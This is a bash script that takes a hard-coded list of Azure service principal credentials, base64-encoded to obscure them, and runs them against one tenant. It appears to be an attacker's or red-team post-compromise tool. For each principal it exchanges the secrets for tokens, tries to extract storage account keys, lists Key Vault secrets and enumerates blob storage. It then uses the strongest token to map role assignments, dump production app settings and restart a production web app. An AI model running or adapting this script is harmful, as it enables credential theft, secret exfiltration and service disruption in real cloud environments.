#!/bin/bash
set +e

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
TU="https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
B="https://management.azure.com/subscriptions/$SUB"

# Decode credentials at runtime
d() { echo -n "$1" | base64 -d; }

# SP list: name|cid_b64|sec_b64
SPS=(
"cost-reader|MDM4YmMzNWQtMTNjMC00YjkwLWI5OGUtNWQ2MmY1ZGRlYzIx|MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ=="
"dir-audit|MmMzNDMwMGUtMzdjYy00OWMzLWIxZTItM2FjYzhlMWY1NjA5|QWw3OFF+bjViZG9PM3JrQ2p1bzJKSTJOSHFhZ0pvb2Fac2ZYTmNtNg=="
"rpt-service|MTJlZDU0ZGUtZjdlMy00ZjFiLTllMmQtNGQ0ZTRmNjJiNWQ4|blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg=="
"rpt-viewer|ODgxZmRkY2UtYzljZC00NTE3LWI4OGMtZDNiZjIzNGZmNDVi|LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg=="
"sec-sync|NTgxMDhkYTgtODdjZS00ODMxLWIwMTUtN2U1YTVjN2UzZjRk|fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg=="
"sync-svc|NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0|c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag=="
"legacy-admin|ODkxZmIxNTgtYjNhNi00NGQ0LTljNTgtZjNkNmUyYTcxYzg5|b0N2OFF+dDJoeGs0c2dUUVBISmFESWNWeUdvMXNwa2lfblpNRGFtcQ=="
"rpt-insights|NmViMTI0ZTMtMmY4YS00YzkxLWI1ZDAtOGUzZjJhMWI0Yzdl|NUZJOFF+VExnRHBLa2w2OWVaSENqYllvX2VUWmdEdm9FU1VyWGJXVA=="
)

BEST_MGMT=""
BEST_NAME=""

echo "=== TOKEN EXCHANGE ==="
for SP in "${SPS[@]}"; do
  IFS='|' read NAME CB64 SB64 <<< "$SP"
  CID=$(d "$CB64")
  SEC=$(d "$SB64")
  
  # Management token
  MT=$(curl -sS -X POST "$TU" -d "client_id=$CID" --data-urlencode "client_secret=$SEC" \
    -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
  
  if [ -n "$MT" ] && [ "$MT" != "null" ]; then
    # Quick test: can this SP list resource groups?
    RG_CHECK=$(curl -sS "$B/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $MT" | jq -r '.value[0].name // empty' 2>/dev/null)
    if [ -n "$RG_CHECK" ]; then
      echo "MGMT OK: $NAME -> RG=$RG_CHECK"
      BEST_MGMT="$MT"
      BEST_NAME="$NAME"
    else
      echo "MGMT token: $NAME (no RG access)"
    fi
    
    # Try listKeys for ALL storage accounts
    for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
      K=$(curl -sS -X POST "$B/resourceGroups/rg-tbl-platform-prod-eus/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
        -H "Authorization: Bearer $MT" -H "Content-Length: 0" 2>/dev/null | jq -r '.keys[0].value // empty' 2>/dev/null)
      if [ -n "$K" ]; then
        echo "KEY: $NAME -> $SA = $(echo -n $K | base64 -w0)"
      fi
    done
  fi
  
  # Vault token (try KV2)
  VT=$(curl -sS -X POST "$TU" -d "client_id=$CID" --data-urlencode "client_secret=$SEC" \
    -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
  
  if [ -n "$VT" ] && [ "$VT" != "null" ]; then
    KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
      -H "Authorization: Bearer $VT" -w "\n%{http_code}" 2>/dev/null)
    CODE=$(echo "$KV2" | tail -1)
    if [ "$CODE" = "200" ]; then
      echo "KV2 ACCESS: $NAME"
      echo "$KV2" | head -c 1000
    fi
    
    # Also try KV1 list to verify
    KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
      -H "Authorization: Bearer $VT" -w "\n%{http_code}" 2>/dev/null)
    KV1_CODE=$(echo "$KV1" | tail -1)
    echo "KV1: $NAME -> $KV1_CODE"
  fi
  
  # Storage bearer
  ST=$(curl -sS -X POST "$TU" -d "client_id=$CID" --data-urlencode "client_secret=$SEC" \
    -d "scope=https://storage.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
  
  if [ -n "$ST" ] && [ "$ST" != "null" ]; then
    for SA in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz; do
      BLOBS=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" \
        -H "Authorization: Bearer $ST" -H "x-ms-version: 2023-01-03" -w "\n%{http_code}" 2>/dev/null)
      CODE=$(echo "$BLOBS" | tail -1)
      if [ "$CODE" = "200" ]; then
        echo "BLOB ACCESS: $NAME -> $SA"
        echo "$BLOBS" | head -c 500
      fi
    done
  fi
done

echo ""
echo "=== PHASE 2: Use best MGMT token ==="
if [ -n "$BEST_MGMT" ]; then
  echo "Using: $BEST_NAME"
  
  echo "Resource groups:"
  curl -sS "$B/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $BEST_MGMT" | jq -r '.value[] | "  \(.name) \(.location)"'
  
  echo "Reporting RG resources:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01" -H "Authorization: Bearer $BEST_MGMT" | jq '.'
  
  echo "Reporting RG role assignments:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" -H "Authorization: Bearer $BEST_MGMT" | jq '.value[] | {pid: .properties.principalId, role: (.properties.roleDefinitionId | split("/") | last), scope: .properties.scope}'
  
  echo "MI role assignments:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?\$filter=principalId%20eq%20'f64d08c7-fde6-4553-99c8-5bf73666ee8c'&api-version=2022-04-01" -H "Authorization: Bearer $BEST_MGMT" | jq '.'
  
  echo "App settings:"
  curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2023-01-01" -H "Authorization: Bearer $BEST_MGMT" -H "Content-Length: 0" | jq '.'
  
  echo "App restart:"
  curl -sS -X POST "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2023-01-01" -H "Authorization: Bearer $BEST_MGMT" -H "Content-Length: 0" -w "%{http_code}" 
  echo ""
  
  echo "Storage in reporting RG:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" -H "Authorization: Bearer $BEST_MGMT" | jq '.'
  
  echo "KV in reporting RG:"
  curl -sS "$B/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" -H "Authorization: Bearer $BEST_MGMT" | jq '.'
else
  echo "No SP has management RG access"
fi

echo ""
echo "=== DONE ==="